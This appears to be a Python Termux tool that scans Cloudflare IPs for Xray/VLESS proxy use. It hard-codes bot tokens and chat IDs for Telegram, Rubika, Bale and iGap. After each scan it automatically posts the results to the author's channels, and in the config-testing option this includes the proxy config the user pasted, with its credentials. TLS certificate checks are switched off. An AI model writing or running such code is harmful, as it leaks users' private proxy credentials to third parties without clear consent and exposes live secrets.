#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import ipaddress
import os
import re
import socket
import ssl
import sys
import time
import json
import random
import threading
import uuid
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    END = "\033[0m"

GITHUB_IP_URL = "https://raw.githubusercontent.com/amir1388hev-glitch/termux_ip/main/Termux_ips"
DOWNLOAD_DIR = "/sdcard/Download"
LOCAL_ALL_IPS_FILE = os.path.join(DOWNLOAD_DIR, "all_ips.txt")

RUBIKA_BOT_TOKEN = "CABGDG0AGFFRWJKSBWBUBRUGGFMYNFITBVVDKTSVBNOKZWANYOITFQILZSSLCRKT"
RUBIKA_CHAT_ID = "g0ILUMK0562851bf38dfcd7703bdeb22"
TELEGRAM_BOT_TOKEN = "8851868234:AAFHxnxQ8AnHubsHtx0fNYtZ4mdGdUyXIoI"
TELEGRAM_CHAT_ID = "-1004437972136"
BALE_BOT_TOKEN = "2690620:Nm1F_42X7P1ZMCg8VMMsQaMKDgDOEbSIvUk"
BALE_CHAT_ID = "5495275998"
IGAP_BOT_TOKEN = "C2487d0c-8f3c-40ba-b567-a38634788195"
IGAP_CHAT_ID = "@ipscanner"

TELEGRAM_ID = "@Pod66Mp"
RUBIKA_ID = "@Amir5880Om"

# تنظیمات پیش‌فرض (SNI پیش‌فرض روی speed.cloudflare.com و Timeout روی 1.7 ثانیه)
SCAN_SETTINGS = {
    "domain": "speed.cloudflare.com",
    "path": "/",
    "port": 443,
    "timeout": 1.7,
    "workers": 20,
    "test_download": True
}

TLS_PORTS = [443, 8443, 2053, 2083, 2087, 2096]
NON_TLS_PORTS = [80, 8080, 8880, 2052, 2082, 2086, 2095]
PORTS_TO_TEST = TLS_PORTS + NON_TLS_PORTS

stop_scan = False
COUNTRY_CACHE = {}

def get_ip_country(ip):
    ip_prefix = ".".join(ip.split(".")[:3])
    if ip_prefix in COUNTRY_CACHE:
        return COUNTRY_CACHE[ip_prefix]
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}?fields=country", timeout=3)
        if res.status_code == 200:
            country = res.json().get("country", "Unknown")
            if country and country != "Unknown":
                COUNTRY_CACHE[ip_prefix] = country
                return country
    except Exception:
        pass
    try:
        res = requests.get(f"https://ipmyp.ir/api/ip/{ip}", timeout=3)
        data = res.json()
        country = data.get("country") or data.get("country_name") or "Unknown"
        if country != "Unknown":
            COUNTRY_CACHE[ip_prefix] = country
            return country
    except Exception:
        pass
    return "Unknown"

def split_message_smart(text, max_length=3500):
    lines = text.split("\n")
    chunks = []
    current_chunk = []
    current_length = 0
    for line in lines:
        if current_length + len(line) + 1 > max_length:
            chunks.append("\n".join(current_chunk))
            current_chunk = [line]
            current_length = len(line)
        else:
            current_chunk.append(line)
            current_length += len(line) + 1
    if current_chunk:
        chunks.append("\n".join(current_chunk))
    return chunks

def send_to_telegram(text):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    success = False
    for chunk in split_message_smart(text, max_length=3800):
        try:
            res = requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": chunk, "disable_web_page_preview": True}, timeout=10)
            if res.status_code == 200:
                success = True
        except Exception:
            pass
    return success

def send_to_rubika(text):
    if not RUBIKA_BOT_TOKEN or not RUBIKA_CHAT_ID:
        return False
    url = f"https://botapi.rubika.ir/v01/{RUBIKA_BOT_TOKEN}/sendMessage"
    success = False
    for chunk in split_message_smart(text, max_length=3200):
        try:
            res = requests.post(url, json={"chat_id": RUBIKA_CHAT_ID, "text": chunk}, timeout=10)
            if res.status_code == 200:
                success = True
        except Exception:
            pass
    return success

def send_to_bale(text):
    if not BALE_BOT_TOKEN or not BALE_CHAT_ID:
        return False
    url = f"https://tapi.bale.ai/bot{BALE_BOT_TOKEN}/sendMessage"
    success = False
    for chunk in split_message_smart(text, max_length=3800):
        try:
            res = requests.post(url, json={"chat_id": BALE_CHAT_ID, "text": chunk}, timeout=10)
            if res.status_code == 200:
                success = True
        except Exception:
            pass
    return success

def send_to_igap(text):
    if not IGAP_BOT_TOKEN or not IGAP_CHAT_ID:
        return False
    url = "https://api.igap.net/v1/bot/sendMessage"
    success = False
    for chunk in split_message_smart(text, max_length=3200):
        try:
            res = requests.post(url, json={"token": IGAP_BOT_TOKEN, "room_id": IGAP_CHAT_ID, "message": chunk}, timeout=10)
            if res.status_code == 200:
                success = True
        except Exception:
            pass
    return success

def send_results_by_country(working_results, header_prefix, port_tested, is_config=False):
    if not working_results:
        return
    country_groups = {}
    for item in working_results:
        if is_config:
            ip, lat, country, cfg_str = item
            val = cfg_str
        else:
            target_str, lat, country = item
            val = target_str
        if country not in country_groups:
            country_groups[country] = []
        country_groups[country].append(val)
        
    for country, items in country_groups.items():
        lines = [f"{header_prefix}", f"Port Tested: {port_tested}", f"SNI / Domain: {SCAN_SETTINGS['domain']}\n"]
        lines.extend(items)
        lines.append(f"\nCountry: {country} | Count: {len(items)}")
        lines.append(f"\nClean IPs provided by:\nTelegram Admin: {TELEGRAM_ID}\nRubika Admin: {RUBIKA_ID}")
        single_message = "\n".join(lines)
        
        print(Colors.YELLOW + f"[*] Sending results for {country} to messengers..." + Colors.END, flush=True)
        
        tg_ok = send_to_telegram(single_message)
        rb_ok = send_to_rubika(single_message)
        bl_ok = send_to_bale(single_message)
        ig_ok = send_to_igap(single_message)
        
        print(f"  ├── Telegram: {'✅ (Success)' if tg_ok else '❌ (Failed)'}")
        print(f"  ├── Rubika:   {'✅ (Success)' if rb_ok else '❌ (Failed)'}")
        print(f"  ├── Bale:     {'✅ (Success)' if bl_ok else '❌ (Failed)'}")
        print(f"  └── iGap:     {'✅ (Success)' if ig_ok else '❌ (Failed)'}")
        time.sleep(0.5)

def get_clean_input(prompt_text):
    try:
        raw_val = input(prompt_text)
        clean_val = re.sub(r"\D", "", raw_val)
        return clean_val
    except (KeyboardInterrupt, EOFError):
        print("\n[*] Exiting...", flush=True)
        sys.exit(0)

def get_ips_from_github(url):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return parse_ip_input(response.text)
    except Exception:
        pass
    return []

def get_ips_from_local_file():
    if os.path.exists(LOCAL_ALL_IPS_FILE):
        try:
            with open(LOCAL_ALL_IPS_FILE, "r", encoding="utf-8") as f:
                return parse_ip_input(f.read())
        except Exception:
            pass
    return []

def parse_ip_input(user_input):
    ips = []
    cleaned_text = user_input.replace("\n", " ").replace("\r", " ").replace("\t", " ")
    tokens = cleaned_text.split()
    
    for token in tokens:
        token = token.strip().strip(",")
        if not token or token.startswith("#"):
            continue
        if ":" in token and not "/" in token:
            token = token.split(":")[0]
            
        if "/" in token:
            try:
                network = ipaddress.ip_network(token, strict=False)
                count = 0
                for ip in network.hosts():
                    ips.append(str(ip))
                    count += 1
                    if count >= 512:
                        break
            except Exception:
                pass
        elif "-" in token and "." in token:
            try:
                parts = token.split("-")
                start_ip = parts[0].strip()
                end_ip = parts[1].strip()
                if end_ip.count(".") == 0:
                    start_parts = start_ip.split(".")
                    end_ip = ".".join(start_parts[:3]) + "." + end_ip
                start = ipaddress.ip_address(start_ip)
                end = ipaddress.ip_address(end_ip)
                current = start
                count = 0
                while current <= end and count < 512:
                    ips.append(str(current))
                    current += 1
                    count += 1
            except Exception:
                pass
        else:
            try:
                ipaddress.ip_address(token)
                ips.append(token)
            except Exception:
                pass
    return list(dict.fromkeys(ips))

def get_manual_ips():
    print(Colors.CYAN + "\nEnter IPs (Paste horizontal/vertical list, press Enter twice to finish):" + Colors.END, flush=True)
    lines = []
    while True:
        try:
            line = input()
            if not line.strip():
                if lines:
                    break
                else:
                    return []
            lines.append(line)
        except (KeyboardInterrupt, EOFError):
            break
    return parse_ip_input(" ".join(lines))

def select_ip_source():
    print(Colors.CYAN + "\nSelect IP source:" + Colors.END, flush=True)
    print("1. GitHub (Online repository)")
    print("2. Manual input (Type or paste)")
    print("3. From local file (/sdcard/Download/all_ips.txt)")
    choice = get_clean_input(Colors.BOLD + "[>] Choose option (1/2/3): " + Colors.END)
    if choice == "1":
        return get_ips_from_github(GITHUB_IP_URL)
    elif choice == "2":
        return get_manual_ips()
    elif choice == "3":
        return get_ips_from_local_file()
    else:
        return []

# تست سخت‌گیرانه همراه با هندشک کامل TLS و شبیه‌سازی ساختار پروکسی Xray
def check_ip_http_latency(ip, port=443, domain="speed.cloudflare.com", timeout=1.7, test_download=True, path="/"):
    for attempt in range(2):
        start_time = time.time()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            
            if port in NON_TLS_PORTS:
                request_data = f"GET {path} HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nConnection: close\r\n\r\n"
                sock.sendall(request_data.encode())
                response = sock.recv(512)
                sock.close()
                if not response or b"HTTP" not in response:
                    continue
            else:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                # هندشک واقعی TLS همراه با SNI دلخواه کاربر
                tls_sock = context.wrap_socket(sock, server_hostname=domain)
                tls_sock.settimeout(timeout)
                
                # ارسال هدرهای سازگار با هندشک استانداردهای پروکسی Xray (VLESS / VMess / Trojan)
                xray_payload = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {domain}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Connection: close\r\n\r\n"
                )
                tls_sock.sendall(xray_payload.encode())
                response = tls_sock.recv(1024)
                tls_sock.close()
                sock.close()
                
                if not response or (b"HTTP" not in response and b"Cloudflare" not in response and len(response) < 10):
                    continue
                    
            latency = (time.time() - start_time) * 1000
            return round(latency, 1)
        except Exception:
            if attempt == 1:
                return None
    return None

def save_to_file(filename_only, data):
    possible_paths = [
        os.path.join(DOWNLOAD_DIR, filename_only),
        os.path.expanduser(f"~/storage/downloads/{filename_only}"),
        os.path.expanduser(f"~/{filename_only}")
    ]
    for filepath in possible_paths:
        try:
            folder = os.path.dirname(filepath)
            if folder:
                os.makedirs(folder, exist_ok=True)
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(data)
            break
        except Exception:
            continue

def configure_settings():
    print(Colors.CYAN + f"\n--- Current Scanner Settings ---" + Colors.END)
    print(f"1. SNI / Domain: {Colors.GREEN}{SCAN_SETTINGS['domain']}{Colors.END}")
    print(f"2. Port: {Colors.GREEN}{SCAN_SETTINGS['port']}{Colors.END}")
    print(f"3. Timeout: {Colors.GREEN}{SCAN_SETTINGS['timeout']}s{Colors.END}")
    print(f"4. Workers (Threads): {Colors.GREEN}{SCAN_SETTINGS['workers']}{Colors.END}")
    
    change = input(Colors.BOLD + "\nDo you want to change settings? (y/n): " + Colors.END).strip().lower()
    if change == 'y':
        new_domain = input(Colors.BOLD + f"Enter new SNI/Domain [Default: {SCAN_SETTINGS['domain']}]: " + Colors.END).strip()
        if new_domain:
            SCAN_SETTINGS['domain'] = new_domain
            
        new_port = input(Colors.BOLD + f"Enter new Port [Default: {SCAN_SETTINGS['port']}]: " + Colors.END).strip()
        if new_port.isdigit():
            SCAN_SETTINGS['port'] = int(new_port)
            
        new_timeout = input(Colors.BOLD + f"Enter new Timeout in seconds [Default: {SCAN_SETTINGS['timeout']}]: " + Colors.END).strip()
        try:
            if new_timeout:
                SCAN_SETTINGS['timeout'] = float(new_timeout)
        except ValueError:
            pass
            
        print(Colors.GREEN + "[+] Settings updated successfully!" + Colors.END)
        time.sleep(1)

def print_banner():
    banner = f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════╗
║ AMIR SCANNER PRO - XRAY & CLOUDFLARE ENGINE                              ║
╠══════════════════════════════════════════════════════════════════════════╣
║ {Colors.YELLOW}► Version :{Colors.WHITE} v2.7.0 (Xray Handshake Enabled){Colors.CYAN}                  ║
║ {Colors.YELLOW}► Current SNI :{Colors.WHITE} {SCAN_SETTINGS['domain']:<20}{Colors.CYAN}                     ║
║ {Colors.YELLOW}► Timeout (Sec) :{Colors.WHITE} {str(SCAN_SETTINGS['timeout']):<18}{Colors.CYAN}                 ║
╚══════════════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner, flush=True)

def finalize_and_send(working_results, total_ips, header_prefix, port_tested, save_filename, is_config=False):
    working_results.sort(key=lambda x: x[1])
    clean_ips_for_file = []
    for item in working_results:
        if is_config:
            ip, lat, country, cfg_str = item
            clean_ips_for_file.append(cfg_str)
        else:
            target_str, lat, country = item
            clean_ips_for_file.append(target_str)
    save_to_file(save_filename, "\n".join(clean_ips_for_file))
    if working_results:
        send_results_by_country(working_results, header_prefix, port_tested, is_config)

def menu_option_1_mahsa():
    global stop_scan
    ips = select_ip_source()
    if not ips:
        print(Colors.RED + "[!] No IPs loaded." + Colors.END, flush=True)
        input(Colors.BOLD + "\n[*] Press Enter to return..." + Colors.END)
        return
    
    port = SCAN_SETTINGS['port']
    domain = SCAN_SETTINGS['domain']
    timeout = SCAN_SETTINGS['timeout']
    workers = SCAN_SETTINGS['workers']
    
    stop_scan = False
    working_results = []
    thread_lock = threading.Lock()
    
    print(Colors.YELLOW + f"[*] Starting Mahsa & Xray Engine Scanner on {len(ips)} IPs (Port: {port}, SNI: {domain}, Timeout: {timeout}s)..." + Colors.END, flush=True)
    
    def worker_task(ip):
        if stop_scan:
            return
        lat = check_ip_http_latency(ip, port=port, domain=domain, timeout=timeout, test_download=True, path="/")
        if lat is not None:
            country = get_ip_country(ip)
            res_str = f"{ip}:{port}"
            with thread_lock:
                working_results.append((res_str, lat, country))
            print(f"{res_str:<22} | {str(lat)+'ms':<10} | Country: {country:<15} | {Colors.GREEN}[WORKING / XRAY OK]{Colors.END}", flush=True)

    with ThreadPoolExecutor(max_workers=workers) as executor:
        try:
            futures = [executor.submit(worker_task, ip) for ip in ips]
            for f in as_completed(futures):
                if stop_scan:
                    break
        except KeyboardInterrupt:
            stop_scan = True

    header = f"📊 Scan Results\nMahsa & Xray CDN Scanner"
    finalize_and_send(working_results, len(ips), header, port, "Mahsa_Bypass_Results.txt")
    print(Colors.GREEN + f"\n[+] Scan finished! Total working IPs: {len(working_results)}" + Colors.END, flush=True)
    input(Colors.BOLD + "\n[*] Press Enter to return to main menu..." + Colors.END)

def menu_option_2_xray():
    global stop_scan
    raw_config = input(Colors.BOLD + "Enter Raw Config (VLESS / VMess / Trojan): " + Colors.END).strip()
    if not raw_config:
        return
    target_ip = input(Colors.BOLD + "Enter Target IP: " + Colors.END).strip()
    if not target_ip:
        return
    port_input = input(Colors.BOLD + f"Enter Port (Leave empty to test default {SCAN_SETTINGS['port']}): " + Colors.END).strip()
    port = int(port_input) if port_input.isdigit() else SCAN_SETTINGS['port']
    
    ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
    found_ips = re.findall(ip_pattern, raw_config)
    old_ip = found_ips[0] if found_ips else None
    
    print(Colors.YELLOW + f"[*] Testing Xray Config with IP {target_ip} on Port {port} (SNI: {SCAN_SETTINGS['domain']})..." + Colors.END, flush=True)
    
    lat = check_ip_http_latency(target_ip, port=port, domain=SCAN_SETTINGS['domain'], timeout=SCAN_SETTINGS['timeout'], test_download=SCAN_SETTINGS['test_download'], path=SCAN_SETTINGS['path'])
    
    working_results = []
    if lat is not None:
        country = get_ip_country(target_ip)
        new_cfg = raw_config.replace(old_ip, target_ip) if old_ip else raw_config
        new_cfg = re.sub(rf"({re.escape(target_ip)}):(\d+)", rf"\1:{port}", new_cfg)
        if f":{port}" not in new_cfg and old_ip:
            new_cfg = re.sub(r':\d+', f':{port}', new_cfg, count=1)
            
        working_results.append((target_ip, lat, country, new_cfg))
        print(f"{target_ip}:{port:<18} | {str(lat)+'ms':<10} | Country: {country:<15} | {Colors.GREEN}[XRAY CONNECTED]{Colors.END}", flush=True)
    else:
        print(Colors.RED + "[-] Target IP failed Xray strict handshake test." + Colors.END, flush=True)
        
    header = f"📊 Scan Results\nXray Config Dedicated Scanner"
    finalize_and_send(working_results, 1, header, port, "Xray_Config_Results.txt", is_config=True)
    print(Colors.GREEN + f"\n[+] Scan finished!" + Colors.END, flush=True)
    input(Colors.BOLD + "\n[*] Press Enter to return to main menu..." + Colors.END)

def menu_option_3_edge():
    global stop_scan
    ips = select_ip_source()
    if not ips:
        print(Colors.RED + "[!] No IPs loaded." + Colors.END, flush=True)
        input(Colors.BOLD + "\n[*] Press Enter to return..." + Colors.END)
        return
        
    port = SCAN_SETTINGS['port']
    domain = SCAN_SETTINGS['domain']
    timeout = SCAN_SETTINGS['timeout']
    workers = SCAN_SETTINGS['workers']
    
    stop_scan = False
    working_results = []
    thread_lock = threading.Lock()
    
    print(Colors.YELLOW + f"[*] Starting Edge & Xray Download Scanner on {len(ips)} IPs (Port: {port}, SNI: {domain})..." + Colors.END, flush=True)
    
    def worker_task(ip):
        if stop_scan:
            return
        lat = check_ip_http_latency(ip, port=port, domain=domain, timeout=timeout, test_download=True, path="/")
        if lat is not None:
            country = get_ip_country(ip)
            res_str = f"{ip}:{port}"
            with thread_lock:
                working_results.append((res_str, lat, country))
            print(f"{res_str:<22} | {str(lat)+'ms':<10} | Country: {country:<15} | {Colors.GREEN}[WORKING / XRAY OK]{Colors.END}", flush=True)

    with ThreadPoolExecutor(max_workers=workers) as executor:
        try:
            futures = [executor.submit(worker_task, ip) for ip in ips]
            for f in as_completed(futures):
                if stop_scan:
                    break
        except KeyboardInterrupt:
            stop_scan = True

    header = f"📊 Scan Results\nEdge IP Scanner (Xray Speed Test)"
    finalize_and_send(working_results, len(ips), header, port, "Edge_Scanner_Results.txt")
    print(Colors.GREEN + f"\n[+] Scan finished! Total working IPs: {len(working_results)}" + Colors.END, flush=True)
    input(Colors.BOLD + "\n[*] Press Enter to return to main menu..." + Colors.END)

def main_menu():
    while True:
        print_banner()
        print(f"""{Colors.CYAN}
╔══════════════════════════════════════════════════════════════════════════╗
║ {Colors.GREEN}[1] Mahsa & Xray CDN Scanner{Colors.CYAN}                              ║
║ {Colors.YELLOW}[2] Xray Config Dedicated Scanner{Colors.CYAN}                          ║
║ {Colors.MAGENTA}[3] Edge IP Scanner (Xray Download Speed Test){Colors.CYAN}            ║
║ {Colors.BLUE}[4] Change Settings (SNI / Port / Timeout){Colors.CYAN}                ║
║ {Colors.END}{Colors.CYAN}[0] Exit{Colors.CYAN}                                                                  ║
╚══════════════════════════════════════════════════════════════════════════╝
""", flush=True)
        choice = get_clean_input(Colors.BOLD + "[>] Select option: " + Colors.END)
        if choice == "1":
            menu_option_1_mahsa()
        elif choice == "2":
            menu_option_2_xray()
        elif choice == "3":
            menu_option_3_edge()
        elif choice == "4":
            configure_settings()
        elif choice == "0":
            print(Colors.YELLOW + "[*] Exiting program..." + Colors.END, flush=True)
            sys.exit(0)
        else:
            print(Colors.RED + "[!] Invalid option selected." + Colors.END, flush=True)
            input(Colors.BOLD + "\n[*] Press Enter to continue..." + Colors.END)
            os.system("clear")

if __name__ == "__main__":
    main_menu()
